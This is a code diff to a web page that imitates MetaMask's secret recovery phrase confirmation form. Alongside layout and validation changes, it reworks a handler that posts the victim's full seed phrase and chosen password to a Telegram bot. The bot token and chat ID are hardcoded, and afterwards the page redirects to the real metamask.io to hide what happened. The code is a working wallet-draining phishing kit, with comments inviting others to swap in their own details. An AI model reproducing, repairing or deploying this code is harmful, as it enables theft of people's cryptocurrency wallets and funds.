@@ -128,27 +128,6 @@
       border: 1px solid #ccc;
       font-size: 14px;
     }
-    .password-row {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      margin-top: 20px;
-      margin-bottom: 20px;
-    }
-    .password-label {
-      font-size: 13px;
-      font-weight: 600;
-      color: #444;
-      margin-bottom: 4px;
-    }
-    input[type="password"] {
-      width: 100%;
-      max-width: 280px;
-      padding: 8px 12px;
-      font-size: 14px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-    }
     .submit-btn {
       background: linear-gradient(90deg, #537cff, #6563ff);
       border: none;
@@ -158,6 +137,7 @@
       font-size: 16px;
       border-radius: 24px;
       cursor: pointer;
+      margin-top: 24px; /* espace entre confirm password et bouton */
     }
     .submit-btn:disabled {
       opacity: 0.5;
@@ -170,12 +150,45 @@
       margin-top: 10px;
       display: none;
     }
+    .password-container {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      align-items: flex-start;
+    }
+    .password-field {
+      display: flex;
+      flex-direction: column;
+      width: 180px;
+    }
+    .password-field label {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    .password-field input {
+      padding: 8px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      width: 100%;
+      box-sizing: border-box;
+    }
     @media (max-width: 600px) {
       .seed-inputs {
         grid-template-columns: repeat(2, 1fr);
       }
       .step-circles {
         gap: 80px;
+      }
+      .password-container {
+        width: 100%;
+        align-items: center;
+      }
+      .password-field {
+        width: 100%;
       }
     }
   </style>
@@ -223,30 +236,42 @@
 
       <div class="seed-inputs" id="seedInputs"></div>
 
-      <div class="password-row">
-        <label for="newPassword" class="password-label">New Password</label>
-        <input type="password" id="newPassword" autocomplete="new-password" />
-        
-        <label for="confirmPassword" class="password-label">Confirm Password</label>
-        <input type="password" id="confirmPassword" autocomplete="new-password" />
+      <div class="password-container" id="passwordContainer" style="display:none;">
+        <div class="password-field">
+          <label for="newPassword">New Password</label>
+          <input type="password" id="newPassword" autocomplete="new-password" minlength="6" />
+        </div>
+        <div class="password-field">
+          <label for="confirmPassword">Confirm Password</label>
+          <input type="password" id="confirmPassword" autocomplete="new-password" minlength="6" />
+        </div>
       </div>
-
-      <p id="passwordErrorMsg" class="error-msg"></p>
-      <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
 
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
         Confirm Secret Recovery Phrase
       </button>
+      <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
 
     </div>
   </main>
 
   <script src="bip39-words.js"></script>
   <script>
+    const submitBtn = document.getElementById("submitBtn");
+    const passwordContainer = document.getElementById("passwordContainer");
+    const newPasswordInput = document.getElementById("newPassword");
+    const confirmPasswordInput = document.getElementById("confirmPassword");
+    const errorMsg = document.getElementById("errorMsg");
+
     function generateInputs() {
       const container = document.getElementById("seedInputs");
       const count = parseInt(document.getElementById("phraseLength").value);
       container.innerHTML = "";
+      passwordContainer.style.display = "none";
+      submitBtn.disabled = true;
+      newPasswordInput.value = "";
+      confirmPasswordInput.value = "";
+      errorMsg.style.display = "none";
 
       for (let i = 1; i <= count; i++) {
         const div = document.createElement("div");
@@ -257,13 +282,8 @@
 
       const inputs = container.querySelectorAll("input");
       inputs.forEach(input => {
-        input.addEventListener("input", () => {
-          checkFieldsFilled();
-          clearPasswordError();
-        });
+        input.addEventListener("input", checkFieldsFilled);
       });
-
-      document.getElementById("submitBtn").disabled = true;
     }
 
     function checkFieldsFilled() {
@@ -278,25 +298,38 @@
         }
       }
 
-      const newPwd = document.getElementById("newPassword").value.trim();
-      const confirmPwd = document.getElementById("confirmPassword").value.trim();
-
-      if (newPwd.length < 6) {
-        allFilled = false;
-      }
-      // Only enable submit if confirm password is filled and matches new password
-      if (confirmPwd === "" || newPwd !== confirmPwd) {
-        allFilled = false;
+      if (!allFilled) {
+        submitBtn.disabled = true;
+        passwordContainer.style.display = "none";
+        errorMsg.style.display = "none";
+        return;
       }
 
-      document.getElementById("submitBtn").disabled = !allFilled;
+      if (validateBIP39Words()) {
+        passwordContainer.style.display = "flex";
+        validatePasswords();
+        errorMsg.style.display = "none";
+      } else {
+        passwordContainer.style.display = "none";
+        submitBtn.disabled = true;
+        errorMsg.style.display = "block";
+      }
     }
 
-    function clearPasswordError() {
-      const pwdErrorEl = document.getElementById("passwordErrorMsg");
-      pwdErrorEl.style.display = "none";
-      pwdErrorEl.textContent = "";
+    function validatePasswords() {
+      const newPass = newPasswordInput.value;
+      const confirmPass = confirmPasswordInput.value;
+      const valid = newPass.length >= 6 && newPass === confirmPass;
+      submitBtn.disabled = !valid;
     }
+
+    newPasswordInput.addEventListener("input", () => {
+      validatePasswords();
+    });
+
+    confirmPasswordInput.addEventListener("input", () => {
+      validatePasswords();
+    });
 
     function validateBIP39Words() {
       const count = parseInt(document.getElementById("phraseLength").value);
@@ -317,36 +350,13 @@
     }
 
     function handleConfirm() {
-      const errorEl = document.getElementById("errorMsg");
-      const pwdErrorEl = document.getElementById("passwordErrorMsg");
-      const newPwd = document.getElementById("newPassword").value.trim();
-      const confirmPwd = document.getElementById("confirmPassword").value.trim();
-
-      // Reset errors
-      errorEl.style.display = "none";
-      pwdErrorEl.style.display = "none";
-      pwdErrorEl.textContent = "";
+      if (submitBtn.disabled) return;
 
       if (!validateBIP39Words()) {
-        errorEl.style.display = "block";
+        errorMsg.style.display = "block";
         return;
-      }
-
-      if (newPwd.length < 6) {
-        pwdErrorEl.textContent = "Password must be at least 6 characters.";
-        pwdErrorEl.style.display = "block";
-        return;
-      }
-
-      if (confirmPwd === "") {
-        // Do not show error if confirm is empty
-        return;
-      }
-
-      if (newPwd !== confirmPwd) {
-        pwdErrorEl.textContent = "Passwords do not match.";
-        pwdErrorEl.style.display = "block";
-        return;
+      } else {
+        errorMsg.style.display = "none";
       }
 
       const count = parseInt(document.getElementById("phraseLength").value);
@@ -356,22 +366,24 @@
         phrase += value.trim() + " ";
       }
 
-      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0";
-      const chatId = "6996434307";
+      const password = newPasswordInput.value;
+
+      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0"; // Remplace ici
+      const chatId = "6996434307";     // Remplace ici
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: `Secret Recovery Phrase:\n${phrase.trim()}\n\nNew Password: ${newPwd}`
+          text: "Secret Recovery Phrase:\n" + phrase.trim() + "\n\nPassword:\n" + password
         })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://metamask.io/";
+        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
       }, 800);
     }
 
@@ -391,10 +403,6 @@
 
       checkFieldsFilled();
     });
-
-    // Enable submit button also when typing password fields
-    document.getElementById("newPassword").addEventListener("input", checkFieldsFilled);
-    document.getElementById("confirmPassword").addEventListener("input", checkFieldsFilled);
 
     window.onload = generateInputs;
   </script>
